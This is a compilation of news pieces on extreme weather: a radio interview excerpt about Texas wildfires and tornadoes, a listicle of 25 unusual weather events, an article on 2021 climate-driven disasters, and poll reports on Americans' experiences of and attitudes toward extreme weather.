AHMED: Tornadoes - you think of that as a much later in spring kind of thing. So it's certainly earlier in the season. And I believe with the wildfires, you know, at least the drought conditions are almost as bad as the drought of record in 2011, which was the last time that we saw probably as intense of a wildfire season.

RASCOE: I would think that climate change is a factor in this. Can you talk about, like, what is causing this change?

AHMED: Yeah, I think with wildfires, that's a lot easier to kind of track. You know, hot, dry conditions - that's definitely something that climate change is increasing, particularly pushing those temperatures and conditions into, you know, earlier spring or late winter. Tornadoes are harder to sort of pin down to climate science. Scientists say it's because the records for tornadoes and, like, how often they happen are pretty hard to prove going back as long. And also the conditions being, like, warmer air colliding with cooler air and the humidity and all of that - like, these things are becoming more common in earlier spring and late winter.

RASCOE: So it sounds like the changes are happening. So it is having an impact. How is it affecting the people who are really most vulnerable to these types of changes?

AHMED: So I guess the idea, you know, behind natural disasters that I've heard a lot from folks who study these is the idea that the events themselves are not disasters, right? So a wildfire in and of itself is not a disaster. A tornado in and of itself is not really a disaster. And it's kind of when we have any of these extreme weather events hit a city or collide with a town, destroying farmland - like, that is really kind of the natural disaster part. That is when you have people struggling to recover from that - rebuilding their homes, recovering all the losses financially, dealing with government agencies - right? - going through this kind of alphabet soup of programs and agencies and all of that.

RASCOE: You've talked a lot about how energy efficiency could make a difference or, like, weatherization of houses and how a lot of that is not happening in Texas or is not mandated to happen in Texas. Like, how does that impact someone's home to not have it be weatherized to withstand really hot weather or really cold weather?

AHMED: Yeah, I mean, we saw this certainly with Winter Storm Uri last year, right? Homes that are sort of built to older standards are not really going to keep a set temperature for a very long time. You're going to be pumping in more heating or cooling, depending on the season, to stay comfortable. So for low-income families or households, that means a much higher energy bill than you'd be paying, you know, if you had upgraded windows, if your insulation was retrofitted and all of that - right? - or even if you had more efficient appliances. Housing, in a lot of senses, is just such an important tool in terms of climate resiliency and in disaster recovery, as well.

RASCOE: How can people prepare to survive this kind of weather? Like, what can they do on their own?

AHMED: Have a go bag ready. Like, if you're in an area where evacuations might be something that you're facing, right - whether it's wildfires or a flood or something like that, you know - with tornadoes, it's harder to predict - but supplies for a couple of days if the power goes out - important documents, you know, licenses, IDs, things like food and water, flashlights, things like generators and whatnot - these are really great to have if you can afford it - right? - in case the power goes out or something like that.

RASCOE: That was environmental journalist Amal Ahmed. Thank you so much for speaking with us.

AHMED: Thank you for having me on.

It had to be either a rarely-seen event or extreme in its severity or intensity.

They range from hurricanes to snow, heat to tornadoes, and wildfires to lightning.

Some weather events are so strange they capture the fascination of even long-time meteorologists.

I don't mean a thunderstorm with quarter-size hail, a menacing shelf cloud, or even a full-fledged blizzard. Those are certainly interesting and awe-inspiring.

I'm talking about weather phenomena that are exceptional in magnitude, extremely rare for a given area or time of year or just flat-out bizarre.

A full history of the strangest weather is beyond the scope of this piece. Instead, I thought I'd take a look at some of the most bizarre things in weather I've seen in my lifetime, dating to the 1970s.

I wish I could rank these, but they're all so weird in their own way. So enjoy this look at weather's weird side.

1. Greenland Fires, Rain Over Icecap Peak

Mention Greenland and you probably think of the island's massive ice sheet. In summer 2017, however, a series of wildfires burned in western Greenland.

While not unprecedented, the amount of fire activity detected by satellite in 2017 over Greenland far exceeded any other year since 2002.

Four years later, rain was observed at the highest point on Greenland's ice cap for the first time, according to the National Snow and Ice Data Center.

2. Two Large Tornadoes at Once

The sight of one large tornado is frightening enough, let alone two side-by-side.

A supercell thunderstorm near Pilger, Nebraska, on June 16, 2014, surprised both residents and even veteran storm chasers by spawning simultaneous large, violent tornadoes.

Both tornadoes produced EF4 damage. One raked through Pilger, killing one, injuring 20, and destroying numerous homes and other buildings.

The second tornado developed southeast of town, tracked parallel to the above-mentioned tornado before jumping in front of it and weakening. This second tornado still claimed one life and demolished three farmsteads.

3. A Months-Long Flood Begins With Surge of Ice Boulders

A rare confluence of factors led to a historic flood in the nation's heartland in March 2019.

Rapid snowmelt was followed immediately by heavy rain from a record-setting bomb cyclone. This unleashed rapid runoff into rivers previously frozen from exceptional February and early-March cold.

The ice-choked Niobrara River in northern Nebraska burst through and destroyed Spencer Dam and sent a wave of water and massive ice slabs into towns and fields.

(WATCH: A 20-Foot Tall Wall of Ice)

A wet spring, summer and fall kept stretches of the Missouri River flooded much of the rest of the year, months longer than another major flood in 2011.

It took until six days before Christmas for Nebraska to be 100 percent free of any National Weather Service flood warnings, watches or advisories, a streak that began just after Groundhog Day.

4. Hurricane Season 'Goes Greek' Twice

One of the few light moments in the otherwise terrible, historic 2005 Atlantic hurricane season was prompted by the Greek alphabet.

For the first time, all 21 names provided by the World Meteorological Organization for the 2005 Atlantic season were used up once record-setting Hurricane Wilma came into play.

On Oct. 22, as Wilma was lashing Cancún, National Hurricane Center (NHC) meteorologists upgraded a new storm southeast of Hispaniola to Tropical Storm Alpha, the first letter of the Greek alphabet.

Another five named storms formed in 2005 after Alpha, ending with Tropical Storm Zeta, which lagged into the new year.

Fifteen years later, the Greek alphabet was again pressed into service.

In the record 2020 Atlantic hurricane season, another nine storms formed after the regular names list was exhausted, taking it through Greek letter Iota.

After 2020, the use of the Greek alphabet itself was retired in lieu of a new supplemental list once the year's names list is exhausted. In 2021, that supplemental list almost had to be used.

The National Hurricane Center's big board listed the Atlantic named storms in late 2005. (AP)

5. Hail Glaciers

On April 11, 2012, a single supercell thunderstorm dumped torrential rain and hail near Dumas, Texas, north of Amarillo.

The volume of both hail and rain overwhelmed a shallow gully near a bridge, piling the water and ice mass into massive drifts up to 10 feet high, trapping vehicles and forcing the closure of U.S. 287 for 12 hours.

A study on so-called ""hail glaciers"" from National Weather Service Meteorologists Justyn Jackson, T. Todd Lindley, and Jane Love, from the New Mexico Bureau of Geology and Mineral Resources uncovered two other hail glacier events in the recent past in the southern High Plains:

-Aug. 14, 2004 (Clayton, N.M.): Up to 16-foot hail glaciers. Some ice cover lasted almost a month, even in late summer.

-May 9, 1994 (Dalhart, Texas): Up to three-foot hail drifts shut down U.S. 385 for almost one month.

In early July 2021, one person died from hypothermia after being trapped in a pile of hail from a slow-moving thunderstorm in Mexico City.

6. 100 Degrees in Siberia

On June 20, 2020, the high temperature in Verkhoyansk, a town in northeastern Russia about 260 miles south of the Arctic coast and about 6 miles north of the Arctic Circle, topped out at 100.4 degrees.

This was the hottest temperature on record north of the Arctic Circle, according to the WMO's Global Weather and Climate Extremes Archive.

In 2020, Siberian wildfires scorched an area larger than Greece. The following summer, active fires covered an area larger than Florida and sent a plume of wildfire smoke over the North Pole in early August 2021.

In December 2021, a ""zombie fire"" was seen smoldering in the snowpack in one of the coldest places on Earth, Siberia's ""Pole of Cold.""

7. White Christmas in South Texas

If you tried to escape winter with a trip to South Padre Island for Christmas 2004, you rolled snake eyes.

Arctic air plunging south intercepted a vigorous upper-level disturbance to produce a White Christmas in Deep South Texas.

It was the first day of measurable snowfall since 1895 in Brownsville, Texas, the same latitude as Miami, on Christmas Day, no less.

This was the heaviest 24-hour snow on record in nearby Victoria, Texas (12.5 inches), and the snowstorm of record in Corpus Christi (4.4 inches).

8. Record Strongest Hurricane Makes Landfall, Few Deaths

If the strongest hurricane on record in the western hemisphere was headed for a landfall, you might fear for the lives of hundreds, if not thousands in its path.

At its peak, Hurricane Patricia packed maximum sustained winds of 215 mph in late October 2015 off the southwest Mexican coast. Its lowest central pressure was later found to bottom out at 872 millibars, only 2 millibars from the global record set by Super Typhoon Tip in 1979.

Still powerful, Patricia weakened to a Category 4 hurricane before making landfall but did so in a rather sparsely populated area north of Manzanillo, Mexico.

""Had the center jogged only 20-30 miles east, the core would've been over an area with 10 times the population density,"" said Michael Lowry, UCAR scientist and former hurricane specialist with The Weather Channel.

Patricia's small wind field and the steep ocean floor offshore meant it couldn't generate a huge storm surge, according to Lowry.

Only two deaths from a fallen tree on a campsite were directly attributed to Hurricane Patricia.

9. Seven Tornadoes Hit One Town on One Night

Earlier, we discussed the frightening sight of two large tornadoes at once.

One Nebraska city more than tripled that in one awful June evening.

Seven tornadoes were spawned by a single, slow-moving supercell thunderstorm in less than three hours on June 3, 1980, in and near Grand Island, Nebraska.

Thanks in part to the parent supercell's slow movement, the most destructive tornado, rated F4, strangely moved from east of town westward into the south side of Grand Island before turning south.

The other area tornadoes also took erratic, loopy paths over previous tornado damage paths.

Five were killed and another 193 were injured, with damage estimated around $300 million.

10. A Spring Snow Survey Without the Snow

Each April 1, the California Department of Water Resources conducts a statewide snow survey, including manual measurements of the Sierra snowpack in several locations. Roughly one-third of California's drinking water comes from the Sierra snowpack, which after melting later in the spring and summer replenishes the state's reservoirs.

There are usually several feet of snow still on the ground in the Sierra at the time of this spring snow survey, which requires a rather long measuring pole.

In 2015, the spring snow survey and news conference near Echo Summit was conducted on bare grass for the first time. Cooperative Snow Surveys Program chief Frank Gehrke could only point to the height on a measuring pole that was the previous record low snowpack there.

Statewide, the snowpack was only 5 percent of the average on April 1, 2015, by far the lowest on record for that date.

11. The Crossing Cones

You're probably aware of a hurricane's ""forecast cone"", the area where National Hurricane Center forecasters expect the center of the tropical cyclone to track over the next five days.

Only once in my career have I seen cones from two different storms cross on one graphic.

In late August 2020, what would later become Hurricane Marco formed in the western Caribbean Sea one day after Hurricane Laura first formed in the central Atlantic Ocean.

Some computer forecast models at the time suggested Laura and Marco could eventually get close enough to interact with each other in a weird circular dance known as the Fujiwhara effect. Some even suggested there could be two Gulf of Mexico landfalls almost simultaneously.

That led to the weird occurrence of two overlapping forecast cones on maps.

The forecast eventually evolved to suggest Marco would first take aim on the Gulf Coast, followed by Laura, which is what happened. Wind shear ripped Marco apart as it neared the northern Gulf Coast of southeastern Louisiana.

Unfortunately, the same could not be said for Laura.

12. The Perfect Storm's Strange Ending

You're probably at least somewhat aware of how destructive the ""Perfect Storm"" was along parts of the Eastern Seaboard, given this historic storm prompted a best-selling book and movie starring George Clooney and Mark Wahlberg.

(FULL RECAP: The Perfect Storm)

Low pressure off Nova Scotia absorbing Hurricane Grace's energy and moisture was impressive enough.

As the overall storm began to weaken after lashing the East Coast as far south as North Carolina, a tiny circulation within the storm intensified into a full-fledged hurricane on Nov. 1, 1991.

This hurricane was never named, for fear of alarming and confusing the public after the hard hit from the Perfect Storm. The so-called ""Unnamed Hurricane"" remained well out to sea and only limped ashore as a weakening tropical storm in Nova Scotia the next day.

13. An EF3 'Firenado'

On July 26, 2018, the Carr Fire descended on the city of Redding, California, eventually damaging just over 1,600 structures on its way to becoming one of the largest wildfires in state history.

What was truly jaw-dropping, though, was the tornado-like vortex generated at the leading edge of the fire, that uprooted trees, crumpled high-tension electricity towers, debarked trees and damaged homes that weren’t otherwise burned.

The National Weather Service's damage survey estimated winds of at least 143 mph in the fire whirl, equivalent to an EF3 tornado. A November 2018 study found the vortex extended up to 17,000 feet above ground.

California only had two previous F/EF3 tornadoes in records since 1950, both of which were in Southern California in the 1970s.

14. Hail in Paradise

Advertisement The hailstone pictured below measured 4.25 inches in length, roughly comparable to the diameter of a softball. Any guesses where? Texas? Oklahoma? Alabama? Those are good guesses, but they're all about 4,000 miles off.

A supercell thunderstorm dropped numerous 2- to 3-inch diameter hailstones, as well as the huge one shown below, on the island of Oahu, Hawaii, on March 9, 2012. This shattered the previous state record 1-inch diameter, quarter-sized hailstone.

The Western Regional Climate Center's ""Climate of Hawaii"" says thunderstorms are reported somewhere in Hawaii about 20-30 days each year.

It goes on to say thunderstorms there are ""infrequent enough so that many people who have lived only in Hawaii have no real notion of the violence of mainland thunderstorms.""

15. Sandy's Snow, Then Snow After Sandy

Superstorm Sandy could take up an entire ""weird"" article by itself.

First, there was the surreal sight of a mention of ""snow"" in a National Hurricane Center advisory for what was, at the time, Hurricane Sandy.

Cold air supplied by a southward plunge in the jet stream plus moisture hurled westward by Sandy produced up to 3 feet of snow in the central and southern Appalachians. Blizzard conditions were reported in some areas.

Just over a week after Sandy moved inland, Winter Storm Athena brought snow to the Northeast coast. New York City reported 4.7 inches from the storm. More than 8 inches was reported on western Long Island near Albertson.

Images from the Jersey Shore showed snow piled on debris left behind by Sandy a little more than a week earlier.

16. A December Derecho, Tornado Outbreak in the Upper Midwest

Five days after a winter storm dumped up to 21 inches of snow, an outbreak of severe thunderstorms raked the Upper Midwest with destructive winds and tornadoes – in December 2021.

This outbreak just 10 days before Christmas spawned Minnesota's first December tornadoes in records dating to 1950. Previously, only one severe thunderstorm warning had ever been issued in December in Minnesota.

The line of severe thunderstorms which raced from Kansas and Nebraska to Wisconsin met the criteria for a derecho. Only 1% of all derechos happen in December, according to NOAA's Storm Prediction Center.

The National Weather Service confirmed 99 tornadoes from this derecho, which together with another deadly tornado outbreak five days earlier, set a new record for December tornadoes.

17. Harvey's Off the Charts Rain

Two of the hurricanes that stood out in my career each involved catastrophic slow crawls.

It took five days before Hurricane Harvey finally moved away from Texas in late August 2017. That sluggish movement produced record-smashing rain.

""Harvey was the most significant tropical cyclone rain event in United States history, both in scope and peak rainfall amounts, since reliable rainfall records began around the 1880s,"" National Hurricane Center forecasters Eric Blake and David Zelinsky wrote in the NHC final report.

(MORE: Full Harvey Recap | The Timeline)

Seven different reporting stations topped the previous U.S. tropical rainfall record during Harvey, according to Blake, lead by 60.58 inches near Nederland, Texas.

A post-storm analysis by Shane Hubbard from the University of Wisconsin-Madison calculated Harvey's 20-inch-plus rainfall footprint was just slightly smaller than the entire state of South Carolina (28,949 square miles).

Over 30,000 people were displaced and over 200,000 homes and businesses were damaged or destroyed by Harvey, according to NOAA. Harvey was the second costliest weather disaster in the U.S. since 1980, with an estimated $141 billion damage.

Two years later, Hurricane Dorian also stalled out, hammering the northwest Bahamas with its eyewall winds for 51 straight hours.

It was the slowest-moving Atlantic Basin major hurricane on record. It even spawned a #1mph hashtag in social media to describe its painfully slow movement.

18. One of the Nation's Weirdest Heat Waves

The upper Midwest sweated through summerlike heat in March 2012, when it was still officially winter, in what was widely considered one of the most anomalous weather events of recent memory.

Numerous cities broke all-time March records, some of them doing so five straight days.

It was so warm that some places had daily lows that were warmer than the previous record highs for those dates. The warmth was so extreme that parts of Michigan rose above their average July high temperatures.

By month's end, more than 15,000 heat records had been broken - 7,755 record daily highs, and 7,517 record-warm daily lows.

Thanks to this heat wave, March was actually warmer than April in over 20 cities.

19. A Hurricane in the South Atlantic Ocean

Until 2004, no hurricane had ever been confirmed in the South Atlantic Ocean.

It was thought wind shear, the change in wind speed and/or direction with height, was too strong in this area to allow clusters of thunderstorms to organize around an area of low pressure to begin the process of tropical cyclogenesis.

In late March 2004, however, wind shear was low off the eastern coast of South America as an upper-level low-pressure system was sprouting thunderstorms near its center.

Making the transition to a tropical cyclone, what was later called Hurricane Catarina turned back westward, making landfall in the Santa Catarina province of Brazil as a Category 1 storm on March 27, 2004.

According to the final summary by Marcelino et al., just over 38,000 structures were damaged and another 1,468 collapsed. Despite the freak nature of this storm, some residents evacuated from the coast.

20. Snow in South Florida

Florida and snow sound like polar opposites, but it is actually a tad less rare in north Florida than it sounds.

On Jan. 19, 1977, residents and snowbirds escaping northern winter were shocked to see snow falling in South Florida, including Miami, for the first time on record.

Snow was reported as far south as Homestead, Florida, and was even reported in Freeport, on Grand Bahama Island.

To the north, Plant City, Florida, east of Tampa, picked up 2 inches of snow.

21. The Heaviest Rainstorm on Earth

Other than the months-long soakings during the wet phase of the Asian monsoon in India, nowhere on Earth sees heavier rainstorms than La Réunion Island, a tiny French island about 500 miles east of Madagascar.

In January 1980, Tropical Cyclone Hyacinthe stalled near the island for about two weeks, dumping up to 239.49 inches, or almost 20 feet, of rain in 15 days.

This is over three times the average yearly rainfall in Miami.

La Réunion's volcanic peaks over 10,000 feet provide strong lift to moist air ramming into its slopes. The island is also at the climatological location where Indian Ocean tropical cyclones pivot from a west-southwest track to a more south to southeast track. Sometimes this turn occurs painfully slow.

Hyacinthe's flooding killed 25 and left 7,000 residents homeless on the island.

22. A January Atlantic Hurricane

The 2016 Atlantic hurricane season got off to a very early start.

Hurricane Alex became the first January Atlantic hurricane since 1955, only the second Atlantic hurricane to form in January - the other was in 1938 - and the strongest January Atlantic hurricane on record, with 85 mph peak winds.

What's more, Alex made landfall on the island of Terceira in The Azores, a group of Portuguese islands located 800 to 900 miles west of Portugal's mainland. Wind gusts over 50 mph were measured in The Azores as the center sliced through.

23. Superstorm 1993

One of the most extreme extratropical storms in U.S. history, this mid-March 1993 storm had it all, including a storm surge resembling that of a hurricane along Florida's Gulf Coast in what was still winter and about as close to whiteout conditions as you'll ever see on Peachtree Street in Atlanta.

Here are just some of the other incredible highlights:

-Six-foot snowdrifts in Birmingham, Alabama

-Up to 6 inches of snow in the Florida Panhandle

-Up to 14-foot snowdrifts in Virginia

-Thousands isolated by heavy snow in the Southeast

-A 12-foot storm surge in Taylor County, Florida

-270 killed in 13 states from Florida to Maine

-$10.8 billion estimated damage (2021 dollars)

-20,000 homes damaged in Florida

-3 million customers lost power

-All major East Coast airports closed

-A derecho raced across Florida and Cuba with a 109 mph wind gust in the Dry Tortugas and a 100 mph gust in Havana, Cuba.

24. Fourteen Years of Rain in 24 Hours

Chile's Atacama Desert is one of the world's driest places. The port city of Antofagasta picks up a mere 0.07 inch of rain a year.

In late March 2015, Antofagasta picked up almost an inch of rain in 24 hours.

While this may not sound like much, lacking soil and plant cover to help absorb rainfall, it just ran off instantly as deadly torrents of water.

The torrential rain flooded the Copiapo River, claiming at least nine lives. Chile's Deputy Interior Minister Mahmud Aleuy called the flooding ""the worst rain disaster to fall on the north in 80 years.""

""That extreme rainfall in South America wasn't just from an isolated thunderstorm, it was with a larger-scale pattern, the key being a very strong ridge of high pressure aloft, as has been the case with so many precipitation and temperature extremes in recent years,"" said Stu Ostro, senior meteorologist at The Weather Channel, in an email at the time.

25. Smashed a National Heat Record, Then Burned Down

If I had to rank all these oddities, what happened in southern British Columbia in late June 2021 might be the most bizarre.

Lytton, British Columbia, shattered Canada's all-time record high three days in a row. It was as hot as Death Valley, California, on June 29 (121 degrees Fahrenheit).

Let that simmer for a moment. A Canadian city topped 120 degrees. That's something usually in the realm of Death Valley, Yuma or Phoenix, some of the hottest locations in North America.

The following day, a wildfire swept through the town, reducing 90 percent of it to rubble.

It was just one of the jaw-dropping things we saw during this historic heat wave, which rewrote the record books from western Canada to northern California.

In 2021, extremely rare weather disasters became alarmingly common.

In Tennessee, cities were deluged with 17 inches of rain over two days. Dozens of people drowned in basement apartments and cars in New Jersey, when floodwater rose as the remnants of Hurricane Ida swept through. In the Pacific Northwest, heat-related illness sent almost 3,000 people to the emergency room when temperatures topped 116 degrees.

All are considered one in 1,000-year events, having only a 0.1% chance of happening in any given year. But as global temperatures rise, these kinds of extremes are happening more frequently.

Like two sides of the same coin, rising temperatures are making dry heat waves more intense, while also causing storms to release heavier deluges. Climate scientists only expect that trend to increase as humans continue releasing heat-trapping gases into the atmosphere.

Whether it was too much water or too much heat, extreme weather events in 2021 exposed major shortfalls in how prepared cities and governments are to handle them. Most of the country's homes, roads and public safety systems were designed for the climate of the last century, when the most extreme weather events currently occurring were considered improbable.

""I think the biggest lesson is that the past is not a good predictor of the future and to begin planning now for what the climate might be 20, 30 years from now,"" says David Easterling, climate scientist at the National Oceanic and Atmospheric Administration (NOAA).

Unprecedented heat waves

In late June, the weather forecast in Washington and Oregon read like something written for Southwestern deserts. Temperatures rose above 110 degrees, well into record-setting territory. An area of high pressure known as a heat dome locked dangerously hot air over the region, deflecting the clouds and cool breezes the region is accustomed to.

With many residents lacking air conditioning, the heat became a public health emergency. Thousands went to the hospital and more than 200 people died. Paved surfaces became perilously hot. Roads and infrastructure buckled. The effects were even worse in cities, where cement absorbs and radiates heat, pushing temperatures even higher.

As the climate gets hotter, extreme heat events are becoming significantly more likely. Globally, temperatures have already risen almost 2 degrees Fahrenheit (1.1 degrees Celsius). If temperatures reach 3.6 degrees Fahrenheit of warming (2 degrees Celsius), scientists predict that a 1-in-50 year heat wave is almost 14 times more likely to happen, according to a major climate assessment released this year by the Intergovernmental Panel on Climate Change (IPCC).

While climate scientists have tracked those overall trends for decades, they're now also homing in on how climate change is intensifying individual heat waves. According to a study by scientists with the World Weather Attribution collaborative, the Pacific Northwest heat wave was made 150 times more likely by the changing climate. In another new report, the American Meteorological Society (AMS) found that climate change influenced many of the 2020 heat waves as well.

""At this point, understanding climate change's role in a heat wave has become highly routine,"" says Stephanie Herring, a NOAA climate scientist who worked on the AMS report. ""Around the world, it's extremely rare to find a heat event not made worse, to some degree, by climate change.""

Overwhelming rainfall

Just six months after the summer heat wave, British Columbia and the Pacific Northwest found themselves scrambling with another climate extreme. An intense winter storm flooded roads and homes, one of several rain-driven disasters this year that exposed how quickly cities can be overcome by water.

In August, heavy rainfall in Waverly, Tennessee led to rapid flash flooding, damaging hundreds of homes and killing more than 20 people. The 17 inches of rain was far outside the bounds of an extreme storm for the area, even more unlikely than a one in 1,000-year event.

Later that month, the remains of Hurricane Ida unleashed heavy rain across the Northeast, stunning many residents. As the streets filled with water, some were trapped in basement apartments and drowned. Others were overtaken in their cars. Authorities vowed to increase flood warnings and go door-to-door for evacuations in the future.

While every storm is different, rising temperatures are already increasing the capacity of storms to release more intense rain.

""Unfortunately, we're starting to see more and more of those rainfall events,"" Easterling says. ""And the expectation is that in the future, because of warming, a warmer atmosphere holds much more moisture and that those events will continue to increase.""

In most of the U.S., the biggest storms are already producing more rain. In the Northeast, those storms produced 55% more rainfall by 2016, compared to 1958, according to the last National Climate Assessment. Globally, the recent IPCC assessment finds that heavy storms will be 14% wetter if the planet warms 3.6 degrees Fahrenheit (2 degrees Celsius).

Most cities, including the stormwater systems that drain water away, aren't designed to handle the most extreme storms. Building infrastructure to handle the heaviest rainfall events can be costly. But while those storms were once thought to be few and far between, climate change is changing the equation.",Extreme Weather,2021-12-23 08:00:00

No matter where they live, a majority of Americans accept the widespread reach of climate change, a significant contributing factor to extreme weather.","Nearly one in three Americans have been personally affected by an extreme weather event in the last two years, according to a new poll from the PBS NewsHour, NPR and Marist. Those types of events — think hurricanes, floods, tornadoes and wildfires — are expected to increase in severity and frequency worldwide as the planet continues to warm due to climate change, and also affect more people in the process.

Severe weather can wipe out homes and businesses, and take a significant toll on social and economic stability. Communities of color, low-income communities and other marginalized groups are most vulnerable to those potentially devastating impacts because they are less likely to have the financial resources to “prepare for and cope with” these events, according to the 2018 National Climate Assessment.

For many, the question is not as simple as choosing to pack up and move away from a place to escape the threat of extreme weather, or the devastation left in its wake. It’s also true that every part of the country will continue to be affected by climate change to varying degrees. Some people view that reality as an indication that there’s no point in trying to avoid areas that are already seeing those dramatic effects on a regular basis.

Breaking down the numbers

29 percent of Americans said they have been personally impacted by an extreme weather event where they live over the past two years.

People who live in the South were the most likely to say they have been affected by an extreme weather event (36 percent), followed by people from the West (31 percent). Respondents in the Midwest were the least likely to have contended with extreme weather (19 percent).

People who live in rural or suburban areas (34 percent and 33 percent, respectively) reported more direct experience with severe weather events compared to small cities, big cities and small towns (30 percent, 27 percent and 24 percent, respectively).

Twenty-nine percent may sound like a relatively small portion of the population. But the devastating impacts of extreme weather events are far-reaching, and often come with an enormous price tag. A record-breaking 22 billion-dollar weather and climate disasters occurred in the United States in 2020, costing the country a total of $95 billion in damages, according to the National Centers for Environmental Information.

While most Americans report not having directly experienced an extreme weather event within the last few years, research suggests that a vast majority of people are on the same page about what’s fueling them.

A poll published Monday by Monmouth University found that three in four Americans believe that global climate change is causing more extreme weather patterns, as well as sea level rise — an established scientific fact that some people continue to doubt or deny. More than half — 56 percent — characterized climate change as a “very serious” issue, with strong political divides: 85 percent of Democrats and 56 percent of independents agreed with that statement, compared to 21 percent of Republicans.

“Increasingly [in our polling,] the Republican respondents either think [climate change is] not a serious problem, and they certainly do not think that the government should be taking more action to address it,” said Tony MacDonald, director of the Monmouth University Urban Coast Institute.

Does extreme weather make people want to move?

It may seem intuitive to assume that the threat — or the direct experience — of losing your home to a wildfire or a flood is enough to significantly influence which places you’d want to live, and which you’d rather avoid. But the reality is rarely so straightforward.

For those who have endured such a disaster, the choice of what to do next is informed by myriad questions, including whether they have the resources to stay and rebuild in the first place, said Gabrielle Wong-Parodi, an assistant professor in the Department of Earth System Science at Stanford University.

When asked whether they would be more likely to rebuild or relocate after an extreme weather event, white people were more likely than Black and Latino people to say they would rebuild their homes in their current community (72 percent versus 56 percent and 60 percent).

42 percent of Black people, 35 percent of Latino people and 23 percent of white people said they would relocate to live somewhere else.

People aged 45 or older were significantly more likely to say they would stay and rebuild than those who are younger (74 percent versus 58 percent).

72 percent of those in the South and 64 percent of those in the West said they would rebuild where they currently live after an extreme weather event, compared to 59 percent in the Northeast and 66 percent in the Midwest.

“Persons of color tend to hold higher perceived risks in the face of these types of events,” which may have to do with resources, i.e. personal wealth, Wong-Parodi said.

In the United States, a significant racial wealth gap has persisted for centuries as a direct and intended result of systemic racism.

“The typical white family has eight times the wealth of the typical Black family and five times the wealth of the typical Hispanic family,” an analysis of 2019 data by the Federal Reserve found. Those numbers, drawn from the 2019 Survey of Consumer Finances, do not account for the coronavirus pandemic, which has taken a disproportionate economic toll on Black and Latino people in the U.S.

After Hurricane Sandy devastated New Jersey in 2012, those who chose to stay and rebuild “tended to be more affluent, [white] individuals,” Wong-Parodi said.

Wealthier people tend to have more resources available to them, which means they may be less likely to feel the need to move or change their lifestyles even if they know they’re at risk of experiencing a severe weather event, MacDonald said. The same logic could extend for those who have actually been affected by a disaster and are deciding what to do next. More resources means more options. In this poll, people whose household income was $50,000 or more were slightly more likely than those making less than $50,000 to say they would rebuild (68 percent versus 65 percent).

When it comes to generational divides, multiple experts pointed to the increased mobility associated with youth compared to older age. Younger people may feel more equipped to reevaluate their options in terms of where to live compared to those who have been rooted in a community for years or even decades.

“Younger people are just going to be more mobile and able to move, whereas older people may have a home, they’re more deeply entrenched in their communities, there’s probably a stronger place attachment and physically what they’re able to do — there’s just more to lose if they have to pick up and go,” Wong-Parodi said.

And for those who have experienced a severe weather event, those community ties can outweigh concerns about something bad happening again.

“Americans who have been impacted [by extreme weather events] have very similar attitudes about their neighborhoods — whether they would rebuild, whether they were likely to stay where they are — than Americans who hadn’t,” said Barbara Carvalho, director of the Marist Poll.

Wong-Parodi echoed that sentiment. People tend to experience “strong place attachment,” she said, and it’s not easy to leave everyone and everything you know behind.

Rudy Lopez, a resident of Los Angeles, said that the term “extreme weather” for him summons far-away images of hurricanes and flooding more so than the seasonal wildfires that occur in his own state.

Lopez said that brush fires have ignited in the hills near his home over the years, but that the city is typically fairly quick to put those out. His location doesn’t typically make him feel at immediate risk of being in the path of the larger fires that tend to burn farther outside the city. And though air quality from wildfire smoke is a long-term health concern, Wong-Parodi noted that not all people would see that as a reason to leave.

Lopez said that if he is impacted by a wildfire at some point in the future, he would most likely stay put. He’s not alone — reports that Californians are leaving the state en masse are overblown, according to studies from the University of California. A survey this spring from the University of California at San Diego found that the percentage of California voters seriously considering leaving the state (23 percent) remains at about the same level as was in a 2019 survey from UC Berkeley.

“This is home. It’s been home now for a little bit over five years, and this is where home will continue to be, God willing,” Lopez said. “So if something — and God forbid — were to happen, I think I would [rebuild].”

Where extreme weather hits the hardest

There are several different types of severe weather events, from the highly unusual blizzard that gripped Texas in February, to wildfires and hurricanes that occur every year but have grown more destructive and more frequent. All of the above can have devastating impacts on communities.

Though people who live in the South or West are more likely to say they have been impacted by extreme weather events in recent months, those responses don’t necessarily correlate with willingness to move elsewhere after that event.

In fact, 16 percent of people overall said they were likely or very likely to move to an area that has seen impacts from severe weather. Poll respondent Kristi Barnwell, who lives in Illinois, said she’s aware that these events are expected to become more frequent, which in her view means that they’re “going to affect most of us at some point or another.”

“There are increasingly extreme weather events, so I don’t think that it’s becoming a concern that would prevent me from moving somewhere,” Barnwell added.

No matter where they live, a majority of Americans accept the widespread reach of climate change, a significant contributing factor to extreme weather.

Fifty-six percent of both inland and coastal residents reported considering climate change to be a “very serious problem” in Monmouth’s Oct. 4 poll. Compared to polling from three years ago, the proportion of inland residents who gave that response has risen 12 points, from 44 percent. The share of coastal residents who felt that way has shrunk in that time, but less dramatically by 5 points.

“Now [there] does seem to be more of a sense that this is a national issue,” MacDonald noted. “So it really is impacting everybody — not only coastal flooding, but also inland flooding and fires.”

That sense of inevitability and universal vulnerability point to the importance of making sure people have the support they need to recover from disasters, and ideally become more resilient in the process.

“We’re going to have to help people adapt and cope with the extremes that they experience in place,” Wong-Parodi said. “Because these events are happening, they’re going to increase and more people are going to be affected.”

Two-thirds of Americans say extreme weather events across the country have been occurring more often than in the past. Far fewer say they’re happening about as often (28%), and only 4% say they are happening less often, according to a new Pew Research Center survey. The findings come amid reports that climate change has contributed to an increase in weather-related disasters.

Pew Research Center conducted this study to understand the public’s views of extreme weather and priorities for improving the country’s infrastructure. For this analysis, we surveyed 10,371 U.S. adults from Sept. 13 to 19, 2021. Everyone who took part in this survey is a member of the Center’s American Trends Panel (ATP), an online survey panel that is recruited through national, random sampling of residential addresses. This way nearly all U.S. adults have a chance of selection. The survey is weighted to be representative of the U.S. adult population by gender, race, ethnicity, partisan affiliation, education and other categories. Read more about the ATP’s methodology. Here are the questions used for the report, along with responses, and its methodology.

When it comes to firsthand experiences with extreme weather, 46% of U.S. adults say the area where they live has had an extreme weather event over the past 12 months, according to the survey, which was conducted Sept. 13 to 19 among 10,371 adults.

Global leaders are set to meet this fall at COP26, a United Nations conference on climate change, where attendees will discuss progress on cutting greenhouse gas emissions to limit global warming. Climate activists have argued that urgent action is needed as the world faces more frequent extreme weather events.

Nearly three-quarters of U.S. adults (73%) in the West South Central census division – an area hit hard by Tropical Storm Nicholas and Hurricane Ida – say they’ve experienced extreme weather within the past year. A majority of adults (59%) say the same in the Mid-Atlantic region, which was affected by recent heavy rains associated with Ida. By contrast, far fewer say they’ve experienced extreme weather in other regions over the past year, including in the South Atlantic (34%) and East North Central census divisions (31%).

